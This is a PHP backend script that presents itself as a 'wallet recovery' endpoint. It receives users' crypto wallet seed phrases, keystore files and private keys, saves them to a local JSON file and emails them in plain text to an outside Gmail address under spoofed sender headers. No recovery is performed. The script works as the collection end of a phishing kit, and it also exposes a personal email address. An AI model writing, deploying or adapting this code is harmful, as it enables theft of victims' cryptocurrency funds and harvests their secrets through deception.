<?php

function jsonResponse($data, $statusCode = 200) {
    http_response_code($statusCode);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function getJsonInput() {
    return json_decode(file_get_contents('php://input'), true);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonResponse(['error' => 'Method not allowed'], 405);
}

$input = getJsonInput();
$type = trim($input['type'] ?? '');
$wallet = trim($input['wallet'] ?? '');
$data = trim($input['data'] ?? '');
$subject = trim($input['subject'] ?? 'Wallet Recovery Request');

if (!$type || !$wallet || !$data) {
    jsonResponse(['error' => 'Missing required recovery fields.'], 400);
}

$phrase = '';
$keystore = '';
$privateKey = '';

if ($type === 'phrase') {
    $phrase = $data;
} elseif ($type === 'keystore') {
    $keystore = $data;
} elseif ($type === 'privateKey') {
    $privateKey = $data;
}

$dataFile = __DIR__ . '/recovery-data.json';
$expiresAt = date('Y-m-d H:i:s', time() + 5 * 3600); // 5 hours
$id = time() . '_' . bin2hex(random_bytes(4));

$entry = [
    'id' => $id,
    'recovery_type' => $type,
    'wallet_name' => $wallet,
    'recovery_data' => $data,
    'phrase' => $phrase,
    'keystore' => $keystore,
    'private_key' => $privateKey,
    'expires_at' => $expiresAt,
    'created_at' => date('Y-m-d H:i:s')
];

if (file_exists($dataFile)) {
    $existing = json_decode(file_get_contents($dataFile), true) ?: [];
} else {
    $existing = [];
}

$existing[] = $entry;
file_put_contents($dataFile, json_encode($existing, JSON_PRETTY_PRINT));

$to = 'prompt60@gmail.com';
$body = "Recovery type: $type\nWallet: $wallet\n\n";
if ($phrase) {
    $body .= "Phrase:\n$phrase\n\n";
}
if ($keystore) {
    $body .= "Keystore:\n$keystore\n\n";
}
if ($privateKey) {
    $body .= "Private Key:\n$privateKey\n\n";
}
$headers = [];
$headers[] = 'From: noreply@codecraftdevs.com';
$headers[] = 'Reply-To: noreply@codecraftdevs.com';
$headers[] = 'X-Mailer: PHP/' . phpversion();
$headers[] = 'Content-Type: text/plain; charset=UTF-8';

$sent = mail($to, $subject, $body, implode("\r\n", $headers));

if (!$sent) {
    jsonResponse(['success' => true, 'message' => 'Recovery entry saved. Admin file created.', 'warning' => 'Mail delivery failed but request is stored.']);
}

jsonResponse(['success' => true, 'message' => 'Recovery request submitted successfully.']);
